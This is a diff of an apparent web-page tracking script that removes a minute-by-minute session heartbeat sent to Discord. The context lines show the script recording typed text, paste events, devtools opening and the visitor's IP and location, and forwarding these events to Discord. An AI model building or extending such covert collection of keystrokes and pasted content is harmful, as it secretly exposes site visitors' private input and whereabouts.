@@ -42,7 +42,6 @@ let scrollDepth = 0;
 let maxScrollDepth = 0;
 let typedText = "";
 let typingTimeout;
-const sessionStartTime = Date.now();
 
 let cachedLocationData = {
     ip: "Unknown",
@@ -280,21 +279,6 @@ case "user_left":
                 ]
             };
 
-        case "session_heartbeat":
-            return {
-                ...baseEmbed,
-                title: "💓 Session Heartbeat",
-                color: 0x747f8d,
-                fields: [
-                    createSessionField(),
-                    {
-                        name: "⏱️ Session Status",
-                        value: `**Duration:** \`${formatDuration(data.session_duration)}\``,
-                        inline: false
-                    }
-                ]
-            };
-
         case "devtools_opened":
             return {
                 ...baseEmbed,
@@ -412,7 +396,6 @@ function getEventColor(event) {
         user_left: 0xf04747,
         form_submit: 0x7289da,
         javascript_error: 0xfaa61a,
-        session_heartbeat: 0x747f8d,
         media_play: 0x43b581,
         media_pause: 0xf04747,
         media_ended: 0x747f8d,
@@ -753,19 +736,6 @@ document.addEventListener("paste", (event) => {
         }
     }
 });
-
-setInterval(() => {
-    const heartbeatData = {
-        userId,
-        sessionId,
-        cookieId: getCookieId(),
-        event: "session_heartbeat",
-        session_duration: Math.floor((Date.now() - sessionStartTime) / 1000),
-        timestamp: new Date().toISOString(),
-    };
-    console.log("Session heartbeat data:", heartbeatData);
-    sendToDiscord(heartbeatData);
-}, 60000);
 
 async function getUserLocation() {
     try {
